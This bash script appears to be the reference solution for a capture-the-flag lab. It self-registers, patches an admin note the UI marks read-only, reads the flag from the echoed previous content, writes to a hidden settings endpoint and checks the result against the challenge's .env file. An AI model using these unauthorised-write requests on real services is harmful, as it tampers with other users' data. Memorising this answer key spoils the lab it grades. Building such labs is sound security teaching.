#!/usr/bin/env bash
# ============================================================
# NoteLock (labs22) — reference solution: UI read-only bypass
# (canEdit:false) with unmasked echo
#
# Chain: self-register -> the note listing masks system/admin notes
# and flags them canEdit:false (the UI honors this) -> PATCH the
# locked note directly — the API performs no ownership or canEdit
# check — and the response echoes the unmasked PREVIOUS content,
# which holds the flag. (A hidden-but-writable settings endpoint is
# also present as a secondary demonstration.)
#
# Usage: ./run.sh [base-url]     (default http://localhost:8102)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8102}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
email="test-$(date +%s)-$RANDOM@arena.local"

echo "[*] self-registering" >&2
TOKEN="$(curl -fsS -X POST "$BASE/auth/register" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$email\",\"password\":\"test123\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')"
[[ -n "$TOKEN" ]] || { echo "[-] failed: registration returned no token" >&2; exit 1; }

echo "[*] listing notes: admin note is masked and flagged canEdit:false" >&2
NOTES="$(curl -fsS "$BASE/api/accounts/32/notes" -H "Authorization: Bearer $TOKEN")"
NID="$(python3 - "$NOTES" <<'PY'
import json, sys
for n in json.loads(sys.argv[1])["items"]:
    if n["canEdit"] is False and n["author_role"] == "admin":
        print(n["id"]); break
PY
)"
[[ -n "$NID" ]] || { echo "[-] failed: no locked admin note found" >&2; exit 1; }
echo "[*] target note id=$NID (canEdit:false — enforced only in the UI)" >&2

echo "[*] secondary bug: settings show ui_editable:false yet the write endpoint accepts us" >&2
curl -fsS -o /dev/null -X POST "$BASE/api/app/priority-entities/threshold-score" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"threshold_score":1000}' && echo "[*] priority threshold accepted (hidden write)" >&2

echo "[*] PATCHing the locked note — response echoes the unmasked previous content" >&2
RESP="$(curl -fsS -X PATCH "$BASE/api/accounts/32/notes/$NID" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"note":"audit verification"}')"
prev="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("previous",""))' <<<"$RESP")"
flag="$(grep -Eo "$FLAG_RE" <<<"$prev" | head -n1 || true)"

if [[ -z "${flag:-}" ]]; then
  echo "[-] failed: previous content did not contain the flag: $RESP" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
